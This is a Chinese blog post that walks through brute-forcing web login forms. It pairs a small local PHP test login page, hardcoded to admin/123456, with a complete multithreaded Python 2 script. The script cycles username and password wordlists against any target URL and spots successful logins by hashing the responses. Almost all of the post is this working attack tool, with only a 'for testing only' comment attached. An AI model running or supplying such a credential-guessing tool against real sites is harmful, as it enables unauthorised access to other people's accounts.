+++
date = "2016-09-05T23:43:22+08:00"
description = ""
draft = false
tags = ["python", "爆破"]
title = "Python实现表单爆破"
topics = ["Python"]

+++

## 接收变量的php脚本如下
> ```php
//代码仅供测试
<?php
    $name = @$_POST['uname'];
    $pass = @$_POST['upass'];

    if (empty($name) or empty($pass)){
        header("location:http://127.0.0.1:921/test/test/index.html");
        exit();
    } else {
        if ($name === 'admin' and $pass === '123456'){
            header("location:http://127.0.0.1:921/test/test/sucess.html");
        } else {
            header("location:http://127.0.0.1:921/test/test/error.html");
            exit();
        }
    }
?>
```

## 爆破表单的python脚本如下
> ```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import hashlib
import requests
from Queue import Queue
import threading
from optparse import OptionParser
from time import sleep

lock = threading.Lock()
queue = Queue()
result = []

class FormBlast(threading.Thread):
    """docstring for FormBlast"""
    def __init__(self, *arg):
        super(FormBlast, self).__init__()
        (options,args,queue) = arg
        self.url = options.url
        self.fname = options.fname
        self.fpass = options.fpass
        self.args = args
        self.queue = queue
        self.s = requests.Session()
        self.base_md5 = ''

    def get_payload(self, vname, vpass):
        dict2 = {}
        if self.args:
            for x in self.args:
                (key,value) = x.split('=')
                dict2[key] = value
        dict1 = {self.fname: vname, self.fpass: vpass}
        payload = dict(dict1, **dict2)
        return payload

    def get_md5(self, html):
        md5 = hashlib.md5()
        md5.update(html)
        return md5.hexdigest()

    def get_base_md5(self):
        proxy = {
            'http': 'http://127.0.0.1:8080'
        }
        payload = self.get_payload('1', '1')
        resp = self.s.post(self.url, data=payload)
        resp.coding = resp.apparent_encoding
        html = resp.text
        self.base_md5 = self.get_md5(html)

                        
    def run(self):
        # global result
        self.get_base_md5()
        while not self.queue.empty():
            (user,pwd) = self.queue.get().split(':')
            payload = self.get_payload(user,pwd)
            try:
                resp = self.s.post(self.url, data=payload, timeout=10)
                resp.coding = resp.apparent_encoding
                code = resp.status_code
                html = resp.text
                curr_md5 = self.get_md5(html)

                if curr_md5 != self.base_md5 and code==200:
                    s = "[Ok] User:%s Pass:%s" % (user,pwd)
                    result.append(s)
                    lock.acquire()
                    print s
                    lock.release()
                    self.queue.task_done()
                else:
                    error = "[Error] User:%s Pass:%s" % (user,pwd)
                    lock.acquire()
                    print error
                    lock.release()
                    self.queue.task_done()
            except requests.exceptions.ConnectTimeout:
                self.queue.put(user+':'+pwd)
            except:
                pass
        # print self.result


def get_content(filename):
    data = []
    with open(filename) as f:
        lines = f.readlines()
        for line in lines:
            data.append(line.strip())
    return data

def get_queue(list1, list2):
    for user in list1:
        for pwd in list2:
            queue.put(user+':'+pwd)

def main():
    parser = OptionParser()
    parser.add_option('-u','--url',dest='url',
                        help='Get target url')
    parser.add_option('-n','--fname',dest='fname',
                        help='The user name in the form')
    parser.add_option('-p','--fpass',dest='fpass',
                        help='The pass name in the form')
    parser.add_option('-L','--namefile',dest='namefile',default='namefile.txt',
                        help='The user name dictionary files')
    parser.add_option('-P','--passfile',dest='passfile',default='passfile.txt',
                        help='The password dictionary files')
    (options,args) = parser.parse_args()

    if options.url and options.fname and options.fpass and options.namefile and options.passfile:
        users = []
        pwds = []
        users = get_content(options.namefile)
        pwds = get_content(options.passfile)
        get_queue(users, pwds)

        for x in xrange(1,41):
            blast = FormBlast(options, args, queue)
            blast.setDaemon(True)
            blast.start()
        queue.join()

        sleep(3)
        print "########################################"
        for x in result:
            print x
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
```

## 结果
> {{% fluid_img src="/img/post/form_blast1.png" alt="表单爆破1" %}}
<br /><br />
{{% fluid_img src="/img/post/form_blast2.png" alt="表单爆破2" %}}